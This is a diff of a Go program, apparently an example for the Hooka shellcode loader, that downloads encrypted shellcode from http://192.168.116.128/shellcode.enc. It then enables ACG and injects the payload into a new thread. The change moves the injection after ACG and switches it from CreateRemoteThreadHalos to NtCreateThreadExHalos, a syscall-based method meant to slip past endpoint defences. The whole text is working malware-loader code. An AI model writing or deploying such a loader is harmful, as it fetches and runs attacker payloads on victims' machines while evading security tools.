@@ -16,6 +16,7 @@ func main() {
 	}
 
 	fmt.Println("[*] Retrieving encrypted shellcode...")
+
 	// retrieve encrypted shellcode from remote url
 	enc_shellcode, err := hooka.GetShellcodeFromUrl("http://192.168.116.128/shellcode.enc")
 	if err != nil {
@@ -30,12 +31,6 @@ func main() {
 	}
 	fmt.Println(shellcode)
 
-	fmt.Println("[*] Injecting shellcode...")
-	err = hooka.CreateRemoteThreadHalos(shellcode)
-	if err != nil {
-		log.Fatal(err)
-	}
-
 	fmt.Println("[*] Enabling ACG...")
 	// enable ACG (useful if process doesn't exits after this)
 	err = hooka.EnableACG()
@@ -43,4 +38,11 @@ func main() {
 		log.Fatal(err)
 	}
 
+	fmt.Println("[*] Injecting shellcode...")
+	err = hooka.NtCreateThreadExHalos(shellcode)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+  fmt.Println("[+] Success!")
 }
